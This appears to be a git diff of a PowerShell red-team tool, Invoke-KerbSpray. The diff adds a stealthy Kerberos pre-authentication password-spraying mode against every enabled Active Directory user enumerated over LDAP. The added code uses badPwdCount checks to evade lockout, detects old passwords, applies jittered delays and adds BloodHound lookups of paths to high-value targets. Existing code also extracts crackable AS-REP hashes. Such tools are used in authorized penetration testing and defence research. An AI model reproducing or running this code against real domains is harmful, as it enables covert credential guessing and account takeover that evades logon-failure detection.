@@ -1,14 +1,15 @@
 function Invoke-KerbSpray {
 <#
 .SYNOPSIS
-    Check Active Directory accounts using Kerberos preauthentication.
+    Guess Active Directory credentials via Kerberos pre-authentication.
 
     Author: Timothee MENOCHET (@TiM0)
 
 .DESCRIPTION
-    Invoke-KerbSpray validates accounts' usernames and credentials by sending a Kerberos AS-REQ.
-    This function can for example be used to identify credential reuse between a previously compromised domain and a target domain.
-    It is highly inspired from tools Rubeus and ASREPRoast written by @harmj0y.
+    Invoke-KerbSpray validates usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
+    Spraying attack can be performed against all the domain users retrieved via LDAP protocol, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
+    Since failing Kerberos pre-authentication does not trigger logon failure event, it is a stealthy way to credential guessing.
+    It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-CleverSpray (by @flelievre) for the LDAP part.
 
 .PARAMETER Username
     Specifies the identifier of an account to send the AS-REQ for.
@@ -29,10 +30,25 @@ function Invoke-KerbSpray {
     Specifies the domain to build the AS-REQ for.
 
 .PARAMETER Server
-    Specify a specific domain controller to send the AS-REQ to.
+    Specifies a specific domain controller to send the AS-REQ to.
+
+.PARAMETER LdapUser
+    Specifies the username for enumerating domain accounts via LDAP.
+
+.PARAMETER LdapPass
+    Specifies the password for enumerating domain accounts via LDAP.
+
+.PARAMETER Limit
+    Specifies the maximum value of the badPwdCount attribute of the target users enumerated via LDAP.
+
+.PARAMETER Delay
+    Specifies delay between authentication attemps.
+
+.PARAMETER Jitter
+    Specifies jitter for the authentication delay, defaults to +/- 0.3
 
 .PARAMETER BloodHound
-    Enable Bloodhound integration.
+    Enables Bloodhound integration to identify attack path to high value targets.
 
 .PARAMETER Credential
     Specifies credentials for Neo4j database.
@@ -54,6 +70,9 @@ function Invoke-KerbSpray {
 
 .EXAMPLE
     PS C:\> Invoke-KerbSpray -DumpFile contoso.ntds -Domain ADATUM.CORP
+
+.EXAMPLE
+    PS C:\> Invoke-KerbSpray -Password 'Welcome2020' -Domain ADATUM.CORP -LdapUser testuser -LdapPass 'P@ssw0rd'
 #>
 
     [CmdletBinding()]
@@ -85,6 +104,21 @@ function Invoke-KerbSpray {
         [String]
         $Server,
 
+        [String]
+        $LdapUser,
+
+        [String]
+        $LdapPass,
+
+        [Int]
+        $Limit = 2,
+
+        [UInt32]
+        $Delay = 0,
+
+        [Double]
+        $Jitter = 0.3,
+
         [Switch]
         $BloodHound,
 
@@ -106,9 +140,9 @@ function Invoke-KerbSpray {
         $Server = [Net.Dns]::GetHostAddresses($Domain) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1 -ExpandProperty IPAddressToString
     }
     elseif ($Server -and -not $Domain) {
-        $SearchString = "LDAP://" + $Server + "/RootDSE"
-        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $null, $null)
-        $Domain = $DomainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
+        $searchString = "LDAP://" + $Server + "/RootDSE"
+        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
+        $Domain = $domainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
     }
     elseif (-not $Domain -and -not $Server) {
         Write-Error "Domain or Server parameter must be specified" -ErrorAction Stop
@@ -117,17 +151,52 @@ function Invoke-KerbSpray {
     if($Hash -like "*:*") {
         $Hash = $Hash.SubString(($Hash.IndexOf(":") + 1),32)
     }
+    $badPwdCount = -1
 
     $credentials = New-Object System.Collections.ArrayList
     if ($Username) {
-        $cred = @{Username = $Username; Password = $Password; Hash = $Hash}
+        if ($LdapUser) {
+            $user = Get-LdapUser -Identity $Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            if ($user) {
+                $badPwdCount = $user.badPwdCount
+            }
+            else {
+                Write-Error "User $($user.samAccountName) does not exist"
+            }
+        }
+        $cred = @{Username = $Username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
         ForEach ($user in Get-Content $UserFilePath) {
-            $cred = @{Username = $user; Password = $Password; Hash = $Hash}
-            $credentials.add($cred) | Out-Null
+            if ($LdapUser) {
+                $user = Get-LdapUser -Identity $Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+                if ($user) {
+                    $badPwdCount = $user.badPwdCount
+                }
+            }
+            if ($LdapUser -and -not $user) {
+                Write-Verbose "$($Username)@$($Domain) does not exist"
+            }
+            else {
+                $cred = @{Username = $user; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
+                $credentials.add($cred) | Out-Null
+            }
+        }
+    }
+    elseif ($LdapUser) {
+        Write-Host "[*] Retrieving the enabled users from the domain $Domain"
+        $users = Get-LdapUser -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+
+        ForEach ($user in $users) {
+            if (($user.badPwdCount -ne $null) -and ($user.badPwdCount -le $Limit)) {
+                $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
+                $credentials.add($cred) | Out-Null
+            }
+            else {
+                Write-Host "[!] Skipping user $($user.samAccountName)@$Domain because its 'badPwdCount' is $($user.badPwdCount) (> $Limit)"
+            }
         }
     }
     elseif ($DumpFile) {
@@ -140,13 +209,13 @@ function Invoke-KerbSpray {
                     $user = $user.split('\')[1]
                 }
                 $nthash = $dump[3]
-                $cred = @{Username = $user; Password = $Password; Hash = $nthash}
+                $cred = @{Username = $user; Password = $Password; Hash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
     }
     else {
-        Write-Error "UserName, UserFile or DumpFile parameter must be specified" -ErrorAction Stop
+        Write-Error "UserName, UserFile, DumpFile or LDAP parameters must be specified" -ErrorAction Stop
     }
 
     ForEach ($cred in $credentials) {
@@ -172,11 +241,17 @@ function Invoke-KerbSpray {
 
             # KDC_ERR_PREAUTH_REQUIRED
             if ($error_code -eq 25) {
-                Write-Host "[+] $($cred.Username)@$($Domain) exists"
+                $output = "[+] $($cred.Username)@$($Domain) exists"
+                if ($LdapUser) {
+                    Write-Verbose $output
+                }
+                else {
+                    Write-Host $output
+                }
             }
             # KDC_ERR_CLIENT_REVOKED
             elseif ($error_code -eq 18) {
-                Write-Host "[*] $($cred.Username)@$($Domain) account disabled or locked out"
+                Write-Host "[-] $($cred.Username)@$($Domain) account disabled or locked out"
             }
             # KDC_ERR_C_PRINCIPAL_UNKNOWN
             elseif ($error_code -eq 6) {
@@ -184,7 +259,17 @@ function Invoke-KerbSpray {
             }
             # KDC_ERR_PREAUTH_FAILED
             elseif ($error_code -eq 24) {
-                Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
+                $newBadPwdCount = $null
+                if ($LdapUser) {
+                    $newBadPwdCount = (Get-LdapUser -Identity $cred.Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                }
+                if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
+                        Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate" -NoNewline
+                        Write-Host " [old password detected]" -ForegroundColor Yellow
+                }
+                else {
+                    Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
+                }
             }
             # KRB_AP_ERR_SKEW
             elseif ($error_code -eq 37) {
@@ -200,14 +285,14 @@ function Invoke-KerbSpray {
                         $result = Invoke-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
                         $pathNb = $result.data[0] | Where-Object {$_}
                         if ($pathNb -gt 0) {
-                            $bhPath = '[PATH TO HIGH VALUE TARGETS]'
+                            $bhPath = ' [PATH TO HIGH VALUE TARGETS]'
                         }
                     }
                     catch {
                         Write-Warning $Error[0].ErrorDetails.Message
                     }
                 }
-                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated! " -NoNewline
+                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated!" -NoNewline
                 Write-Host $bhPath -ForegroundColor Red
             }
             # KDC_ERR_WRONG_REALM
@@ -224,17 +309,115 @@ function Invoke-KerbSpray {
         }
         # AS-REP
         elseif ($Tag -eq 11) {
-            Write-Host "[+] $($cred.Username)@$($Domain) exists and does not require Kerberos preauthentication!"
-            $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
-            $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
-            $cipher = $temp.Sub[0].GetOctetString()
-            $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
-            $asrepHash = $repHash.Insert(32, '$')
-            "`$krb5asrep`$$($cred.Username)@$($Domain):$($asrepHash)"
+            if (-not ($cred.Password -or $cred.Hash)) {
+                Write-Host "[+] $($cred.Username)@$($Domain) does not require Kerberos preauthentication!"
+                $encPart = $asn_AS_REP.Sub[0].Sub | Where-Object {$_.TagValue -eq 6}
+                $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 2}
+                $cipher = $temp.Sub[0].GetOctetString()
+                $repHash = [BitConverter]::ToString($cipher).Replace("-", $null)
+                $asrepHash = $repHash.Insert(32, '$')
+                "`$krb5asrep`$$($cred.Username)@$($Domain):$($asrepHash)"
+            }
+            else {
+                if ($BloodHound) {
+                    $pathNb = 0
+                    $bhPath = $null
+                    #$query = "MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group),p=shortestPath((n)-[r*1..]->(m)) WHERE m.objectsid ENDS WITH "-512"  RETURN COUNT(p) AS pathNb"
+                    $query = "
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    RETURN COUNT(p) AS pathNb
+                    "
+                    try {
+                        $result = Invoke-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                        $pathNb = $result.data[0] | Where-Object {$_}
+                        if ($pathNb -gt 0) {
+                            $bhPath = ' [PATH TO HIGH VALUE TARGETS]'
+                        }
+                    }
+                    catch {
+                        Write-Warning $Error[0].ErrorDetails.Message
+                    }
+                }
+                Write-Host "[+] $($cred.Username)@$($Domain) successfully authenticated!" -NoNewline
+                Write-Host $bhPath -ForegroundColor Red
+            }
         }
         else {
             Write-Warning "Unknown tag number for '$($cred.Username)@$($Domain): $Tag'"
         }
+
+        $randNo = New-Object System.Random
+        $waitingTime = $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+        Start-Sleep -Seconds $waitingTime
+    }
+}
+
+function Local:Get-LdapUser {
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Identity,
+
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Properties = "*",
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server,
+
+        [String]
+        $LdapUser,
+
+        [String]
+        $LdapPass
+    )
+
+    $searchString = "LDAP://$Server/RootDSE"
+    $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
+    $rootDN = $domainObject.rootDomainNamingContext[0]
+    $searchString = "LDAP://$Server/$rootDN"
+    $disabledUserAccountControl = 2,514,546,66050,66082,262658,262690,328194,328226
+    $filter = $null
+    if ($Identity) {
+        $filter = "(samAccountName=$Identity)"
+    }
+    else {
+        foreach($userAccountControl in $disabledUserAccountControl) {
+            $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
+        }
+    }
+    $filter = "(&(samAccountType=805306368)$filter)"
+    if ($LdapUser) {
+        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $LdapUser, $LdapPass)
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
+    }
+    else {
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
+    }
+    $searcher.filter = $filter
+    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
+    $searcher.PropertiesToLoad.AddRange(($propertiesToLoad)) | Out-Null
+    Try {
+        $results = $searcher.FindAll()
+        $results | Where-Object {$_} | ForEach-Object {
+            $objectProperties = @{}
+            $p = $_.Properties
+            $p.PropertyNames | ForEach-Object {
+                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
+                    $objectProperties[$_] = $p[$_][0]
+                }
+                elseif ($_ -ne 'adspath') {
+                    $objectProperties[$_] = $p[$_]
+                }
+            }
+            New-Object -TypeName PSObject -Property ($objectProperties)
+        }
+        $results.dispose()
+        $searcher.dispose()
+    } Catch {
+        Write-Error "Error: $_" -ErrorAction Stop
     }
 }
 
@@ -262,7 +445,7 @@ function Local:Invoke-BloodHoundQuery {
     $Uri = "http://$($Neo4jHost):$($Neo4jPort)/db/data/cypher"
     $Header = @{'Accept'='application/json; charset=UTF-8'; 'Content-Type'='application/json'}
     $Body = @{query=$Query} | ConvertTo-Json
-    $reply = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body -Credential $Credential
+    $reply = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body -Credential $Credential -Verbose:$false
     if($reply){
         return $reply
     }
